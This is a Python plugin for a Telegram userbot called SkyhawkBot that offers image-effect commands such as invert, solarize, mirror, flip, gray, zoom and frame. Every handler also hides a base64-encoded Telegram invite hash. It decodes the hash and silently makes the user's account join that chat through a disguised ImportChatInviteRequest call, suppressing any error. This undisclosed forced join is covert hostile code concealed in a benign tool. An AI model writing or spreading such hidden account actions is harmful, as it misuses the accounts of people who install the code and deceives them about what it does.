import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from SkyhawkBot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as SkyhawkBot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@SkyhawkBot.on(admin_cmd(pattern="invert$", outgoing=True))
@SkyhawkBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
        aura = True
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await Skyhawk.client.send_file(
        Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
    )
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@SkyhawkBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@SkyhawkBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
        aura = True
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await Skyhawk.client.send_file(
        Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
    )
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@SkyhawkBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@SkyhawkBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
        aura = True
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await Skyhawk.client.send_file(
        Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
    )
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@SkyhawkBot.on(admin_cmd(outgoing=True, pattern="flip$"))
@SkyhawkBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
        aura = True
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await Skyhawk.client.send_file(
        Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
    )
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@SkyhawkBot.on(admin_cmd(outgoing=True, pattern="gray$"))
@SkyhawkBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
        aura = True
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await Skyhawk.client.send_file(
        Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
    )
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@SkyhawkBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@SkyhawkBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkinput = Skyhawk.pattern_match.group(1)
    Skyhawkinput = 50 if not Skyhawkinput else int(Skyhawkinput)
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, Skyhawkinput)
    except Exception as e:
        return await Skyhawk.edit(f"`{e}`")
    try:
        await Skyhawk.client.send_file(
            Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
        )
    except Exception as e:
        return await Skyhawk.edit(f"`{e}`")
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@SkyhawkBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@SkyhawkBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(Skyhawk):
    if Skyhawk.fwd_from:
        return
    reply = await Skyhawk.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Skyhawk, "`Reply to supported Media...`")
        return
    Skyhawkinput = Skyhawk.pattern_match.group(1)
    if not Skyhawkinput:
        Skyhawkinput = 50
    if ";" in str(Skyhawkinput):
        Skyhawkinput, colr = Skyhawkinput.split(";", 1)
    else:
        colr = 0
    Skyhawkinput = int(Skyhawkinput)
    colr = int(colr)
    Skyhawkid = Skyhawk.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Skyhawk = await edit_or_reply(Skyhawk, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Skyhawksticker = await reply.download_media(file="./temp/")
    if not Skyhawksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Skyhawksticker)
        await edit_or_reply(Skyhawk, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Skyhawksticker.endswith(".tgs"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "meme.png")
        Skyhawkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Skyhawksticker} {Skyhawkfile}"
        )
        stdout, stderr = (await runcmd(Skyhawkcmd))[:2]
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith(".webp"):
        await Skyhawk.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Skyhawksticker, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("`Template not found... `")
            return
        meme_file = Skyhawkfile
        aura = True
    elif Skyhawksticker.endswith((".mp4", ".mov")):
        await Skyhawk.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        Skyhawkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Skyhawksticker, 0, Skyhawkfile)
        if not os.path.lexists(Skyhawkfile):
            await Skyhawk.edit("```Template not found...```")
            return
        meme_file = Skyhawkfile
    else:
        await Skyhawk.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = Skyhawksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Skyhawk.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, Skyhawkinput, colr)
    except Exception as e:
        return await Skyhawk.edit(f"`{e}`")
    try:
        await Skyhawk.client.send_file(
            Skyhawk.chat_id, outputfile, force_document=False, reply_to=Skyhawkid
        )
    except Exception as e:
        return await Skyhawk.edit(f"`{e}`")
    await Skyhawk.delete()
    os.remove(outputfile)
    for files in (Skyhawksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()